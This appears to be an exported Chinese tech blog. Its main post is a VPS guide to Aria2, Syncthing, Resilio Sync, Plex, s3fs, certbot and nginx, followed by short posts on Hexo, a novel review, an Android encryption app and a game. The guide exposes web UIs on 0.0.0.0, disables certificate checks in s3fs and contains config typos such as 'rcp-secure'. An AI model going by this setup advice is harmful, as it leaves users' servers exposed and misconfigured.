<p>Aria2(<a href="https://github.com/aria2/aria2">传送门</a>)是一款命令行下载工具。虽然只能用命令行使用Aria2,AriaNG(<a href="https://github.com/mayswind/AriaNg">传送门</a>)，但是它的功能的确很强大，比迅雷强大的多。Aria支持种子，磁力链接，链接，metalink。可以手动设置每个服务器的最大连接数，可以设置多线程下载是区块的大小。也可以手动导入tracker server等。例如我们可以加入国内的一些节点，这样即使服务器在国外，也可以高速下载国内的种子。</p>
<p>虽然没有官方的GUI，但是第三方的GUI也是不错的。例如webui-aria2(<a href="https://github.com/ziahamza/webui-aria2">传送门</a>),AriaNG(<a href="https://github.com/mayswind/AriaNg">传送门</a>)。AriaNG是一个新上线的项目,star并不如webui-aria2多。 由于我第一个接触到的是webui-aria2，再加上webui-aria2和AriaNG在功能上没有特别大的差距，我就没有尝试AriaNG。 <img data-src="/static/images/hexo-config4.png" alt="webui" /></p>
<h2 id="x002-installation-for-aria2">0x002 Installation for Aria2</h2>
<p>我们先安装Aria2，在安装它的GUI webui-aria2。 简单一些，对于Ubuntu的同学来说可以直接<code>apt-get install aria2</code> 这样做非常的快捷，只是版本比较老，为2015年发布的1.19。 关于编译请参考这篇文章(<a href="https://npchk.info/debian-aria2-install/">传送门</a>)</p>
<p>从官方仓库直接下载旧版Aria2<code>apt-get install aria2</code></p>
<h2 id="x003-configuration-for-aria2">0x003 Configuration for Aria2</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建配置文件夹并进入</span></span><br><span class="line">mkdir ~/.aria2 &amp;&amp; <span class="built_in">cd</span> ~/.aria2</span><br><span class="line"><span class="comment">#下载配置文件</span></span><br><span class="line">wget http://cloud.vccvps.com/aria2/aria2.conf</span><br><span class="line"><span class="comment">#用来发现DHT节点，解决国外下载国内种子没有速度</span></span><br><span class="line">wget http://cloud.vccvps.com/aria2/dht.dat</span><br><span class="line"><span class="comment">#创建一个空的 Aria2 下载任务保存文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#x27;</span> &gt; /root/.aria2/aria2.session</span><br></pre></td></tr></table></figure>
<p>由于有中文注释，所以aria2.conf打开可能会出现乱码。</p>
<p>添加了DHT节点后，我们可以继续添加Tracker Server。 这儿推荐一个自动更新的Tracker列表——&gt;<a href="https://github.com/ngosang/trackerslist">传送门</a> 添加前20的节点到aria2.conf。 例如： <figure class="highlight"><table><tr><td class="code"><pre><span class="line">bt-tracker=udp://tracker.skyts.net:6969/announce,udp://tracker.safe.moe:6969/announce,udp://tracker.piratepublic.com:1337/announce,udp://tracker.pirateparty.gr:6969/announce,udp://tracker.coppersurfer.tk:6969/announce,udp://tracker.leechers-paradise.org:6969/announce,udp://allesanddro.de:1337/announce,udp://9.rarbg.com:2710/announce,http://p4p.arenabg.com:1337/announce,udp://p4p.arenabg.com:1337/announce,udp://tracker.opentrackr.org:1337/announce,http://tracker.opentrackr.org:1337/announce,udp://public.popcorn-tracker.org:6969/announce,udp://tracker2.christianbro.pw:6969/announce,udp://tracker1.xku.tv:6969/announce,udp://tracker1.wasabii.com.tw:6969/announce,udp://tracker.zer0day.to:1337/announce,udp://tracker.mg64.net:6969/announce,udp://peerfect.org:6969/announce,udp://open.facedatabg.net:6969/announce</span><br><span class="line">#抗DMCA的服务器设置如下选项</span><br><span class="line">enable-dht=true</span><br><span class="line">bt-enable-lpd=true</span><br><span class="line">enable-peer-exchange=true</span><br></pre></td></tr></table></figure> 如果想要开启token认证，在aria.conf写入： <figure class="highlight"><table><tr><td class="code"><pre><span class="line">rcp-secure=true</span><br><span class="line">rcp-secret=your-secret-token</span><br></pre></td></tr></table></figure> 如果使用用户名和密码，在aria.conf写入： <figure class="highlight"><table><tr><td class="code"><pre><span class="line">rcp-secure=true</span><br><span class="line">rpc-user=yourusername</span><br><span class="line">rpc-passwd=yourpasswd</span><br></pre></td></tr></table></figure> 如果设置SSL，在aria.conf写入： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关于如何用let&#x27;s encrypt免费生成证书，将在之后 0x06 域名设置 中提到。</span></span><br><span class="line">rpc-certificate=/etc/letsencrypt/live/yourdomain.com/fullchain.pem</span><br><span class="line">rpc-private-key=/etc/letsencrypt/live/yourdomain.com/privkey.pem</span><br></pre></td></tr></table></figure> <em>附Aria2 参数翻译，请见文末</em></p>
<h2 id="x003-starting-aria2">0x003 Starting Aria2</h2>
<p>我们需要建立一个下载目录，例如 <code>~/aria2-download</code>。 启动Aria2 <code>aria2c --enable-rpc --rpc-listen-all</code> <em>可用<a href="http://blog.jobbole.com/87278/">tmux</a>来管理窗口，或者防止关闭ssh窗口，服务自动结束</em></p>
<p><strong>注意</strong>打开端口<code>sudo iptables -A INPUT -p tcp --dport 32400 -j ACCEPT</code>。 <strong>注意</strong>下载目录的权限。 如果出现端口冲突，执行<code>lsof -i :端口</code>。然后杀死占用端口的进程<code>kill -9 进程ID</code></p>
<h2 id="x004-webui-aria2">0x004 Webui-aria2</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ziahamza/webui-aria2.git</span><br><span class="line"><span class="comment">#编辑配置文件</span></span><br><span class="line">vim configuration.js</span><br></pre></td></tr></table></figure>
<p>请注意配置encrypt(若为true，则意味着启用了SSL)。 auth的配置需要和aria2.conf中一致。 启动服务器<code>node node-server.js</code> 请注意打开端口<code>sudo iptables -A INPUT -p tcp --dport 6800 -j ACCEPT</code></p>
<h2 id="x005-browse-the-service">0x005 browse the service</h2>
<p>访问youserverip:6800 左侧max-connection-per-server可以设置的最大值为16。 如果<code>configuration.js</code>中的<code>encrypt</code>设置为了`true，需要勾选<strong>启用 SSL/TLS 加密</strong>。 <img class="lazyload" data-src="/static/images/hexo-config5.png"></p>
<h1 id="x04-syncthing">0x04 Syncthing</h1>
<h2 id="x001-introduction-2">0x001 Introduction</h2>
<p>资源下完了接下来就是同步。开源的Syncthing更加适合用于服务器与服务器之间备份，它支持像github一样基于版本的更新及备份。但是它的速度并没有Resilio Sync快。并且它并没有苹果客户端。它拥有官方包以及社区封装的安装包。</p>
<h2 id="x002-installation-1">0x002 Installation</h2>
<p>安装syncthing官方版本。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https</span><br><span class="line">curl -s https://syncthing.net/release-key.txt | sudo apt-key add -</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb https://apt.syncthing.net/ syncthing stable&quot;</span> | sudo tee /etc/apt/sources.list.d/syncthing.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install syncthing</span><br></pre></td></tr></table></figure> 修改syncthing本地监听为公网监听。 修改/root/.config/syncthing/config.xml 中27行 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;127.0.0.1:8384&lt;/address&gt;</span><br><span class="line">//修改为</span><br><span class="line">&lt;address&gt;0.0.0.0:8384&lt;/address&gt;</span><br></pre></td></tr></table></figure> 注意打开端口。 登陆 yourIP:8384 <img class="lazyload" data-src="/static/images/hexo-config6.png"> Syncthing支持KCP加速--&gt;<a href="https://forum.syncthing.net/t/connections-over-udp/9382">传送门</a></p>
<h1 id="x05-resilio-sync">0x05 Resilio Sync</h1>
<h2 id="x001-introduction-3">0x001 Introduction</h2>
<p>Resilio Sync是一个跨平台支持P2P下载，节点越多下载速度越快的分布式网盘。即使单个节点向本地机器备份，速度也很快。然而它并不是开源的，pro版本支持<strong>选择性同步</strong>,支持加密后同步到第三方服务器。支持公网上相互同步，也支持内网中相互同步。文件大小没有限制，文件数量没有限制。Resilio Sync 在2.2x版本之前，Resilio Sync支持DHT，但是现在只支持官方Tracker Server。然而在中国Tracker Server被墙了。不走全局代理是没有办法连上Tracker Server的。</p>
<p>Resilio Sync 解决Tracker Server被屏蔽---&gt;<a href="https://medium.com/@dawnray/resilio-sync%E7%BF%BB%E5%A2%99%E6%96%B9%E6%A1%88-d6f0551fec48">传送门</a></p>
<p>或者使用拥有DHT功能的旧版本Resilio Sync(又名BT Sync)---&gt;下载地址来自官网：<a href="2.0.124/windows64/BitTorrent-Sync_x64.exe">windows 7 or later</a></p>
<h2 id="x002-installation-2">0x002 Installation</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb http://linux-packages.resilio.com/resilio-sync/deb resilio-sync non-free&quot;</span> | sudo tee /etc/apt/sources.list.d/resilio-sync.list</span><br><span class="line">wget -qO - https://linux-packages.resilio.com/resilio-sync/key.asc | sudo apt-key add -</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install resilio-sync</span><br></pre></td></tr></table></figure>
<p>启动 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service resilio-sync start|stop</span><br></pre></td></tr></table></figure> 开机自动启动 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d resilio-sync <span class="built_in">enable</span></span><br></pre></td></tr></table></figure> 修改配置文件/etc/resilio-sync/config.json，修改成0.0.0.0，公网监听。 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&quot;webui&quot;:</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;listen&quot;</span> : <span class="string">&quot;0.0.0.0:8888&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <strong>注意</strong>开启端口 <strong>注意</strong>端口冲突</p>
<p>重启Resili Sync,访问<code>yourip:8888</code>。 同步时注意文件夹权限。 使用chown -R rslsync:rslsync /path/to/folder 来更改所有者</p>
<h1 id="x06-plex">0x06 Plex</h1>
<h2 id="x001-introduction-4">0x001 Introduction</h2>
<p>Plex是一个多媒体管理软件。它可以帮助你管理视频，音乐，电影。它也可以帮助你进行转码，以流媒体的方式在线播放。例如你可以用离线下载，高速下载小姐姐，然后在线观看超清的小姐姐。想想是不是就很激动呢。</p>
<h2 id="x002-installation-3">0x002 Installation</h2>
<p>在plex注册，并下载最新的Ubuntu安装包。---&gt;(<a href="https://www.plex.tv/">官网</a>) 使用<code>dpkg -i pelxmeida.deb</code>进行安装。</p>
<h2 id="x003-configuration">0x003 Configuration</h2>
<p>启动Plex <code>service plexmediaserver start</code> <strong>注意</strong>打开端口。 因为Plex只支持本地访问并配置，所以我们使用ssh隧道进行连接并且配置。 在这里我使用的是putty。首先正确配置putty，保证可以连接到服务器。 配置SSH Tunnels。 <img class="lazyload" data-src="/static/images/hexo-config7.png"> 打开浏览器，访问<code>http://localhost:8888/web</code>。 按着指示配置下去就好了。 <strong>注意</strong>媒体文件夹的权限 <strong>注意</strong>实时转码非常的慢。1080P实时转码一直卡，即使使用八核的vps。 我们可以先优化，先进行转码，转完码再看。这样我们只需要一个速度快一点的网。根据我自己的测试，一集23分钟的番533.8MB转码后的大小为2个G。也就是说你需要1.5M/s的实际网速才可以流畅播放1080P视频。 <img class="lazyload" data-src="/static/images/hexo-config8.png"></p>
<h1 id="x07-mount-digital-space">0x07 Mount digital space</h1>
<h2 id="x001-introduction-5">0x001 Introduction</h2>
<p>我们可以在vps上放这么多东西，20GB的空间怎么够？vps的空间也的确是贵。但是我们可以用云盘-Digitalocean space（$5 250G）。我们可以将space挂载到vps上。</p>
<h2 id="x002-installation-4">0x002 Installation</h2>
<p>我们借助s3fs-fuse来进行挂载。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载编译工具</span></span><br><span class="line">sudo apt-get install automake autotools-dev fuse g++ git libcurl4-gnutls-dev libfuse-dev libssl-dev libxml2-dev make pkg-config</span><br><span class="line"><span class="comment">#下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/s3fs-fuse/s3fs-fuse.git</span><br><span class="line"><span class="comment">#编译</span></span><br><span class="line"><span class="built_in">cd</span> s3fs-fuse</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure> ## 0x002 Configuration 我们要拥有一个spaces，拥有API Spaces access keys的key和secret。由于secret刷新一次页面就会隐藏掉，所以我们要Generate new keys。记下key和secret。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编辑配置文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;your-spaces-name:your-key:your-secret&#x27;</span> &gt; ~/.passwd-s3fs</span><br><span class="line"><span class="comment">#设置权限</span></span><br><span class="line">chmod 0600 ~/.passwd-s3fs</span><br><span class="line"><span class="comment">#挂载</span></span><br><span class="line">s3fs your-space-name /mount-directory -ourl=https://yourendpoint.com -o allow_other -o no_check_certificate</span><br></pre></td></tr></table></figure> 由于程序的不稳定，会遇到<code>fail to connect</code>。可以先<code>umount</code>在重新进行挂载<code>s3fs your-space-name /mount-directory -ourl=https://yourendpoint.com -o allow_other -o no_check_certificate</code>。</p>
<p>#0x08 HTTPS 我们使用let's encrypt来生成SSL证书 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装certbot</span></span><br><span class="line">apt-get install certbot</span><br><span class="line"><span class="comment">#为微服务，没有根目录的服务生成证书。注意停止nginx，因为生成证书需要占用443端口。</span></span><br><span class="line">certbot certonly --standalone -d yourdomain.com</span><br></pre></td></tr></table></figure> 证书生成在<code>/etc/letsencrypt/live/</code> 下对应的域名文件中。 证书的有效期为90天，所以我们将其设置为自动更新。 新建一个文件<code>certbot-auto-renew-cron</code> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">15 2 * */2 * certbot renew --pre-hook <span class="string">&quot;service nginx stop&quot;</span> --post-hook <span class="string">&quot;service nginx start&quot;</span></span><br></pre></td></tr></table></figure> 每隔 两个月的 凌晨 2:15 执行 更新操作 最后加载脚本<code>crontab certbot-auto-renew-cron</code>。</p>
<h1 id="x09-域名设置">0x09 域名设置</h1>
<p>首先添加A记录，设置子域名。 编辑nginx配置<code>/etc/nginx/sites-available/default</code> 以plex服务作为例子。Plex的端口是32400. 我们使用端口转发。 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line"> listen 80;</span><br><span class="line"> listen 443 ssl;</span><br><span class="line">ssl_certificate /etc/letsencrypt/live/subdomain.yourdomain.com/fullchain.pem;</span><br><span class="line">ssl_certificate_key /etc/letsencrypt/live/subdomain.yourdomain.com/privkey.pem;</span><br><span class="line">    include /etc/letsencrypt/options-ssl-nginx.conf;</span><br><span class="line">    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;</span><br><span class="line"> server_name yourdomain.com;</span><br><span class="line">  location /&#123;</span><br><span class="line"> proxy_redirect off;</span><br><span class="line"> proxy_pass http://127.0.0.1:32400;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 重启nginx，就可以访问我们的子域名了。</p>
<h1 id="x09-参考">0x09 参考</h1>
<a href="http://www.senra.me/aria2-conf-file-parameters-translation-and-explanation/">Aria 参数翻译</a>
<hr>
<p><img data-src="/static/images/hexo-gift.jpg" /></p>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Server</tag>
        <tag>Aria2</tag>
        <tag>Sync</tag>
        <tag>Media server</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo DAY</title>
    <url>/posts/96b31775/</url>
    <content><![CDATA[<p>Hexo first try! <a id="more"></a> ## hexo This is my first time to use hexo. It is a statc cms. Thus easy to deploy and does not need much resources. The official guide makes me a little confused.It is a little tricky to insert audios and images.</p>
<h2 id="digitalocean">Digitalocean</h2>
<p>Digitalocean offers one-clip-app for node.js. It really saves me lots of time. Also Digitalocean offers a detailed guide for deploying hexo. That is really nice.</p>
<h2 id="material-theme">Material Theme</h2>
<p>There are lots of themes in the hexo. I look through them in the order of stars.I finally choose this theme, because it is concise. I think I tend to customize it ugiler.</p>
<figure>
<img data-src="/static/images/hexo_day-gift.jpg" alt="death knight" /><figcaption aria-hidden="true">death knight</figcaption>
</figure>
]]></content>
      <categories>
        <category>Technology</category>
      </categories>
      <tags>
        <tag>Technology</tag>
      </tags>
  </entry>
  <entry>
    <title>水滴状耳坠</title>
    <url>/posts/ccaf9d6e/</url>
    <content><![CDATA[<p>愤怒的香蕉《异域求生记》娱乐书评 <a id="more"></a></p>
<p>"他左耳上戴着的一只靛蓝色宝石耳坠，呈晶莹的水滴形状，为他柔美的外表平添了几分冷意。"</p>
<p>怀着对香蕉笔下那种温馨气氛的追寻,我花了不少时间读完了香蕉的第一本书<strong>《异域求生记》</strong>。这本书有明显的缺点，也有写的非常好的地方，就让我来简短的评价一下这本书。</p>
<h2 id="x01-概述">0x01 概述</h2>
<p>这是一本穿越小说，但是我更觉得它是一本西幻小说。因为虽然在设定上它具有穿越的元素，但是全文并没有围绕穿越来展开。一般在穿越小说中，主角所解决的最后一个谜团便是他为什么会穿越。然而在这一本书中，穿越的原因完全没有出现在剧情中。在我看来，穿越只是赋予了小说一个架空的世界。从人物名字，帝国的架构便可以看出这是一本西幻小说。</p>
<p>剧情从唐忆走进森林开始。唐忆想要去参加一个女孩子的葬礼，因此需要穿过一片森林。当他走进森林的一刹那，他便穿越了。在守望森林中，他遇见了由狼抚养大的女孩-小雪。</p>
<p>在森林旁边的小镇上，唐忆认识了芙尔娜。由于芙尔娜四叔-艾德里安·沃尔的出现，唐忆被逼离开守望森林，芙尔娜也被艾德里安·沃尔给带到了丹玛了。为了拯救芙尔娜以及复仇，唐忆来到了丹玛并在旅途上认识了大公妃凯瑟琳和克琳娜。在丹玛唐忆借助了凯瑟琳的力量来拯救芙尔娜，但唐忆却因为凯瑟琳的缘故，接触到了更大的阴谋：伊夫利特家族的造反，半兽人的入侵。在小说结尾，唐忆甚至走到了大陆最大宗教-光神宫的对立面-由于好基友文森特被光神宫杀死。</p>
<p>这是《异域求生记》的第一部。作者也放出了第二部，第三部的大纲。(见文章末尾)</p>
<h2 id="x02-情节">0x02 情节</h2>
<p>香蕉的这本书有烂尾的嫌疑。对于很多坑也是没有填。比如小雪有没有什么特殊的背景，露西妮更深层次的背景，唐忆为什么会穿越，唐忆在穿越之前出车祸死掉的女孩子到底是谁。（这些在大纲中也找不到答案）这也是香蕉从局部到整体的写作方法的弊端。设定逐步变得庞大，坑越来越多，明线，暗线到处都是。这就容易后期结局难写，对于剧情的掌控能力变弱。</p>
<p>香蕉的写作角度是从局部到整体，从小到大的。从守望森林这样一个与世无争的地方开始，逐渐写到守望森林旁边的小镇，接着到丹玛，到帝都，视野再放大到整片大陆。初期的登场人物也就只有两人。我很喜欢这样的写作方法。这样逐渐展开世界的画卷，不光给我带来了不少的惊喜，在开头中也避免了许多对设定的强行解释。</p>
<p>每次我以为异世界已经完全呈现在我的眼前（我一开始以为那个异世界便只有守望森林），但是香蕉会给我一些惊喜。他将这幅瑰丽的卷轴再展开一些，呈现出新的风貌。</p>
<p>《异域求生记》的开头便是第三人称，读者跟随着唐忆来探索异世界。这儿并没有过多对设定的解释。唯一对唐忆背景的解释也被处理成了插叙，夹杂在异世界的探险中。在初期的阅读中不会带来晦涩的感觉。</p>
<p>但是这样也会存在问题，如何衔接场景，如何将原来的小场景镶嵌到大场景中去。然而香蕉是用人物的动机来将场景串在了一起。</p>
<p>唐忆来到镇子上是因为他想离开森林。他原本的目的便是穿过森林，虽然说他在森林里穿越了。</p>
<p>唐忆来到丹玛是为了向艾德里安·沃尔复仇，并救回芙尔娜。</p>
<p>唐忆来到昆恩堡是因为凯瑟琳的委托。</p>
<p>唐忆来到帝都是因为加百列临死前的委托，让唐忆带一些东西给巴克那罗夏。</p>
<p>唐忆被卷入半兽人的战争中是为了夏乌佳和帮助凯瑟琳维持这个帝国。</p>
<p>每次场景的转换，都是因为唐忆明确的动机。这使得每次场景的转换变得非常的自然。然而这样也带来了一个问题，那便是剧情的支离破碎。在《异域求生记》中并不存在一条明确的主线。随着唐忆离开原来的地方，前往新的地方，我们可以看到新的主线的出现。从一开始的复仇变成与半兽人的斗争。但是香蕉用巧妙的手法解决了这样一问题。在香蕉的笔下，推动剧情的是人物之间的矛盾。贯穿整本书的便是艾德里安·沃尔与唐忆之间的矛盾。一开始他们的矛盾由芙尔娜所引起。在解决第一个矛盾之后，他们的矛盾围绕着半兽人与人类以及夏乌佳的命运开始展开。矛盾的开始，矛盾的结束，支线-伏笔，新的矛盾的开始，新的矛盾的结束。香蕉便是这样串起来所有的剧情。尽量合理的矛盾，可以解决的矛盾让整本书的剧情看起来更加的合理。</p>
<p>唯一令我疑惑的剧情便是关于伊琳娜的支线。在这个少女身上，我感受到了加百列的痕迹。作者也埋下了伏笔。但作者却没有在后文进行详述。应该是作者放弃了这一条支线。</p>
<p>总体来说剧情的合理程度，以及剧情的连贯度还是不错的。</p>
<h2 id="x03-人物">0x03 人物</h2>
<p>小雪是出现在小说一开始的角色，可以说是女主了。在守望森林中，小雪救下了唐忆，全心全意照顾他，并且对他百依百顺。虽然小雪和唐忆起初不能用语言沟通，但是作者用动作描写，心理描写塑造出了一个纯洁，活泼，善良的小雪，以及小雪对唐忆的爱。他们在守望森林的生活给我留下了很多记忆深刻的场景，例如小雪第一次开口结结巴巴的喊出，阿忆。小雪一连消失几天，只是为了捡回唐忆的帐篷。这些温暖的场景在我心中印下了小雪的模样。后来小雪陷入沉睡，一睡就是大半本书，一直到末尾才醒来。/怨念</p>
<p>作者花了不少笔墨来塑造凯瑟琳。凯瑟琳在主线中也起到了极大的作用。她是唐忆和帝国的一个桥梁。唐忆借助凯瑟琳的影响力完成了自己的目的，也因为凯瑟琳的影响力陷入了更大的麻烦当中去。凯瑟琳的形象随着主线的推进，不断的丰满。从一开始的雍容华贵，到之后的理性、强势，面对命运的坚强，以及后来对唐忆的爱。御姐气质贯穿全文。这是我认为书中最有个性的人物。</p>
<p>我觉得芙尔娜这个人物的塑造可以说不是那么的成功。芙尔娜在前期的主线中起到推进的作用。芙尔娜推动唐忆从守望森林走向丹玛。小说初期把芙尔娜塑造成一个拥有贵族气质的偏执少女。前期芙尔娜与唐忆的一系列事情中，我感受到了芙尔娜对唐忆偏执的爱。尤其是芙尔娜知道唐忆死掉后，她精神崩溃的场景给我留下了深深的印象。但在小说后期，并没有新的情节来丰满芙尔娜的形象后，芙尔娜的形像便崩塌了。芙尔娜与唐忆之间为数不多的互动也仅仅体现出芙尔娜对唐忆的百依百顺。那个曾经偏执的贵族少女就这样消失了。</p>
<p>总的来说，香蕉对于人物的塑造还是有独到的见解。只要他花笔墨对人物进行塑造，人物都会立起来。</p>
<h2 id="x04-设定">0x04 设定</h2>
<p>这是一部架空小说，作者在开头用插叙的手法描绘了唐忆在原来世界的生活。由此来交代唐忆的背景，唐忆的人际关系。让我感到困惑的是香蕉为什么要描述这样一个唐忆在原来世界遇到的女孩。可能是为了用侧面描写来刻画唐忆这个人物。通过这个女孩的话和行为来反映出唐忆的孤独，缺乏关怀。</p>
<p>整部小说的架空设定可以说是中规中矩，并不存在什么脑洞大开的阴谋。也没有过分的借用西幻的模板，例如种族，职业之类的。</p>
<h2 id="x05-主题">0x05 主题</h2>
<p>在这本书中，并不存在好人和坏人。每个人物都有着自己行动的原因。艾德里安·沃尔建造通天之塔是为了实现各种生物之间的平等；凯瑟琳想要炸山，便是为了国家利益所考虑。每个人的行为都尽量的合理化。</p>
<p>记得村上春树也有着这样的想法。首先村上春树认为世界上没有好人和坏人。每个人的行为都有着自己的原因。所有的行为都是合理的。即使一个杀人犯，他也会有自己杀人的理由。其次，村上不想将自己放在法官的位置上来判决他人。他觉得自己既没有能力，也不想去审判别人。每次对他人的宣判都是对他人的一次伤害。</p>
<p>在这样一个没有善恶观念的世界，我们所能看到的便是更加纯粹的动机。这本书就是营造了这样一个安静的，远离喧嚣的场景。书中没有愚蠢的行为，每个人的行为都尽量的合理。书中的每一个剧情，我们都需要用自己的价值观来进行判断。作者在试图用这样一个故事，来表达自己诉求。</p>
<h2 id="x06-文笔">0x06 文笔</h2>
<p>香蕉的文笔一向是有着传统文学的气息。用来烘托气氛的景物描写还是很到位的。每到一个新的场景，香蕉首先会做景物描写，做一个气氛的营造。接着在气氛已经确定的情况下，展开故事。这样的故事读起来确实更加流畅。</p>
<p>小雪和唐忆的日常生活还是写的很到位的，字里行间洋溢着恬静与温馨。一些稀疏平常的日常情节在香蕉笔下，也会充满了温馨的气氛，处处洋溢着恩爱的气息。再加上香蕉偶尔描述描述不平常的事件（例如小雪一连消失几天），努力刻画唐忆的心理活动，为这温馨的气氛增色了不少。</p>
<p>但是对于大场景的描写，尤其上升到国家的层次，香蕉的文笔还是有所欠缺。有一些明明应该还处于剧情上升状态的阶段，香蕉已经开始对剧情高潮进行描写。这应该是暗线以及气氛塑造的不到位所应起的。如果增加一些暗线，人物的互动来衬托气氛，把千钧一发的气氛所体现出来，那么剧情的高潮会更加的精彩。</p>
<h2 id="结语">结语</h2>
<p>书中的确有几个出色，立体的人物，但主线剧情力度不够；文笔较为出色，主题不是那么的空洞，但设定不够新颖。</p>
<a href="https://blog.inevitable.tech/books/YiYuQiuShengJiDaGang.html">第二部，第三部大纲</a>
<hr>
<div data-align="right">
第三次编辑于2017-11-19
</div>
<p><img class="lazyload" data-src="/static/images/yyqs.jpg"></p>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓开发 App-MessageEncrypt</title>
    <url>/posts/6dda0c12/</url>
    <content><![CDATA[<p>第一个Android App。 <a id="more"></a> 前段时间他问我PGP的事情。的确安卓上没有适合并且适用的PGP加密软件，那就自己写一个呗。于是我开始了我的第一个Android开发。</p>
<p>我还特意没有选Java作为开发语言，我选择了kotlin。kotlin的可读性的确要比java强一些，除去它的各种令人头疼的特殊符号。虽然前几年Google宣布kotlin成为了Android开发的官方语言，但真的去仔细翻一翻官方文档，很多范例仍旧是Java的。那就只能看其他人写的类似程序片段，或者再github搜索相关api，看看其他人的做法。但是有些人的范例特别老，Api版本跟你不一样，这时候就要注意了。或者有的时候一个相同的功能有多种调用api实现的方法，虽然有的是错的或者有坑。</p>
<p>kotlin官方是宣称自己和java是百分之百的兼容。自己也提供了可以把java代码转为kotlin的工具。有的时候还是比较好用的，比如说匿名函数的生成。我对kotlin的匿名函数把握的很差劲，这个官方工具就帮了我不少的忙。但是它经常会犯一些低级错误。变量的声明每次都会错。而且初始化方面和java的变量也不同。我遇到最麻烦的事情就是kotlin的变量作用域。if里面的变量就只能再if中有效，catch也是。匿名函数的闭包也很强，对于新手来说，如何传导数值就成为了一个问题。解决方案便是以参数的方式传入，或者在class的开头，function的外面声明几个变量。这个几个变量的作用域还是挺大的，基本涵盖了整个class。</p>
<p>不得不吐槽的是，我百分之八十的时间都花在了研究如何使用api上，程序逻辑倒是不怎么花时间。感觉Android开发对于新手来说就是查字典。</p>
<p>程序的设计也是变动了很多此。从一开始的悬浮球设计到现在的文字选单设计。为了方便使用，我的想法是做成google translate那样，选中文字后，就会有一个悬浮球在手机屏幕右侧，一点击便可以查询。我找了很多，虽然有找到类似的设计，但是我看不大明白。抄下来，左改改右改改也是改不明白。后来我换成了选中文字后，在文字选择菜单处点击可以加密的方法。这个方法的点击次数与悬浮球设计是相同的。但是问题是很多app都是自己写的文字菜单，我的app的加密选项就无法显示。令人欣慰的是，当你打字的时候，那个输入框的文字选择菜单都是原生的，没有被修改过。</p>
<p>本来我打算的工作流程是，选择文字，点击加密，进行加密操作后，返回之后密文就已经替换了你原来选中的那些文字。但是Android的api似乎不允许我这么做。当用户点击加密的时候，activity进行跳转的同时，选中的文字就已经被替换了。</p>
<p>由于我没有过多进行适配和兼容的测试，所以倒也没有什么烦心的bug出现。</p>
<p>由于时间的原因，我还有其他事情要做，所以开发的时间比较短，而且我对android开发也比较陌生。在这样资源受限的情况下，我逐渐的领悟到什么叫保持简洁，关注于核心功能。先把核心功能开发出来。其他的东西再一步一步的加上去。我把复杂的PGP替换成了AES加密。ui没有进行专门设计，签名，散列值校验也都没做。</p>
<p>写完了第一版以后，接下来的问题就变成了维护，更新和写新的project怎么取舍了。</p>
<p>Github上的Readme也还没更新。Android Studio上整合的github插件是真的好用，它的conflict的处理非常的直观。日常简单使用完全足够。</p>
<p>Github<a href="https://github.com/kismet-cruz/MessageEncrypt">链接</a>,Google Play<a href="https://play.google.com/store/apps/details?id=com.inevitable.pgpkeyboard">链接</a></p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Program</tag>
      </tags>
  </entry>
  <entry>
    <title>A Clockwork Ley-line</title>
    <url>/posts/3a5ce272/</url>
    <content><![CDATA[<p>架空世界观adv就是那么的舒服。 <a id="more"></a></p>
跑完团，突然想玩一些有着自己世界观的ADV，于是就选上了这个《A Clockwork Ley-line》。这游戏一共是三部曲，流程还是挺长的。整个游戏的框架并不是那么的宏大。一般提到ADV，脑海中浮现的都是完全架空的世界观，主角们的使命便是去拯救世界之类的。但是在这样一款游戏中，作者并没有去描绘这样一个架空的世界。只是描绘了一个魔法存在的校园。由于对细节的描绘并不够充分，例如一切的起源，发展，管理架构之类的，所以缺乏一些实感。整个校园也没有给读者留下足够的神秘感。但是游戏中的校园还是有着它自己的特色，不想哈利波特里面的校园，也不像其他游戏中的校园。这个校园有着属于自己的谜题等待着读者去探索。
<center>
<img class="lazyload" data-src="/static/images/aClockworkLeyline-1.png" height="80%" width="80%">
</center>
